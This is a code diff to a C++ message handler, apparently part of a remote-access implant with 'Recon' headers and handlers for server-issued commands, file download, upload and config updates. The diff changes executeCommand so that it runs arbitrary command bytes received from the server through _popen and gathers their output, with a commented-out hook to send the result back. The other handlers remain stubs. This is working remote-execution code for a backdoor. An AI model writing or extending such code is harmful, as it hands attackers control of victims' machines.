@@ -5,6 +5,7 @@
 #include "MessageTypes.h"
 #include "MessagePublisher.h"
 #include "Recon.h"
+#include <iostream>
 
 #include <cstdlib> // NOTE: needed to execute shell cmd
 
@@ -13,31 +14,56 @@
 
 bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 {
-	//return std::system(byte2string(data)); // returns non-zero on error
-	return false;
+	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;
+	//return std::system(byte2string(data).c_str()); // returns non-zero on error
+
+	std::string command = byte2string(data).c_str();
+	std::string result;
+
+	// EASIEST METHOD - just use _popen directly
+	FILE* pipe = _popen(command.c_str(), "r");
+	if (!pipe)
+	{
+		result = "ERROR: Failed to execute command";
+	}
+	else
+	{
+		char buffer[128];
+		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
+		{
+			result += buffer;
+		}
+		_pclose(pipe);
+	}
+
+	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
 }
 
 bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
 {
+	std::cout << "downloadFile" << std::endl;
 	return false;
 }
 
 bool MessageHandler::uploadFile(std::vector<uint8_t>& data)
 {
+	std::cout << "uploadFile" << std::endl;
 	return false;
 }
 
 bool MessageHandler::updateConfig(std::vector<uint8_t>& data)
 {
+	std::cout << "updateConfig" << std::endl;
 	return false;
 }
 
 bool MessageHandler::handleServerError(std::vector<uint8_t>& data)
 {
+	std::cout << "handleServerError" << std::endl;
 	return false;
 }
 
-/*
+
 std::vector<uint8_t> MessageHandler::string2byte(std::string& inMsg)
 {
 	return std::vector<uint8_t>(inMsg.begin(), inMsg.end());
@@ -47,7 +73,7 @@ std::string MessageHandler::byte2string(std::vector<uint8_t>& inMsg)
 {
 	return std::string(inMsg.begin(), inMsg.end());
 }
-*/
+
 
 // this function processes the header of the message
 // to determine how to interpet the contents/data of 
